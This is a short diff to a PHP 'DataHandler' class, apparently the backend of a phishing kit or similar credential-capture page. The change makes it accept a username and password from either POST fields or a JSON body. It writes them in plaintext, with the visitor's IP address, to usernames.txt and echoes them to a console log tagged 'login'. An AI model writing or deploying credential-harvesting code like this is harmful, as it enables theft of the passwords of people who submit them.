@@ -44,11 +44,15 @@ abstract class DataHandler
         }
 
         $data = json_decode(file_get_contents('php://input'), true);
+
+        $user = $_POST['user'] ?? $data['user'];
+        $pass = $_POST['pass'] ?? $data['pass'];
+
         file_put_contents(
             __DIR__ . '/../../usernames.txt',
             "IP: $ipaddress\n" .
-            "Username: {$data['user']}\n" .
-            "Pass: {$data['pass']}\n" .
+            "Username: $user\n" .
+            "Password: $pass\n" .
             "——————————————————————————————————\n",
             FILE_APPEND
         );
@@ -56,9 +60,10 @@ abstract class DataHandler
         self::logToConsole(json_encode([
             'tag'  => 'login',
             'ip'   => $ipaddress,
-            'user' => $data['user'],
-            'pass' => $data['pass'],
+            'user' => $user,
+            'pass' => $pass,
         ]));
+        
     }
 
     private static function logToConsole($string)
